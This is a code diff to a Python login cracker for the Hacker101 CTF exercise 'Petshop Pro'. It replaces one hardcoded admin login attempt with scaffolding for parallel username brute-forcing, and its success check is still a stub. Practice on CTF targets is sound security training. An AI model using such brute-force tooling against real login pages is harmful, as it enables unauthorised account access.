@@ -2,7 +2,7 @@
 Hacker 101 CTF exercise "Petshop Pro" login cracker.
 """
 
-import core.net.http as http
+from bruting import http as h
 from core.conf.http import HttpRequest
 from core.constants.http import Protocol, HttpMethod, ContentType, HeaderField
 
@@ -15,8 +15,6 @@ HEADERS = {
     HeaderField.ACCEPT.value: ContentType.HTML.value[0]
 }
 
-UP = {USERNAME_FIELD: "admin", PASSWORD_FIELD: "12345"}
-
 
 def crack_username(ip, instance_id):
     """
@@ -26,6 +24,16 @@ def crack_username(ip, instance_id):
     :return:
     """
     path = "/".join((instance_id, ENDPOINT))
-    req = HttpRequest(method=HttpMethod.POST, host=ip, path=path, headers=HEADERS, body=UP)
+    req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
+    h.parallel_attack(req_template, generate_uname_req, is_good_uname)
 
-    return http.send_one(req)
+
+def generate_uname_req(template, value):
+    target = template.clone()
+    body = {USERNAME_FIELD: str(value), PASSWORD_FIELD: ""}
+    target.body = body
+    return target
+
+
+def is_good_uname(resp):
+    return True
